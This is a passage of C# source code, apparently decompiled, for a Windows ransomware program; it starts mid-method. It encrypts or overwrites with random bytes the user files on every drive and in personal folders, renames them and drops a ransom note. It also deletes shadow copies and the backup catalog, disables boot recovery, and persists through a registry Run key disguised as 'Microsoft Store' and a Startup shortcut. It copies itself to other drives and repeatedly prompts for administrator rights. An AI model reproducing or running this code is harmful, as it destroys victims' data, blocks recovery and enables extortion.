				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
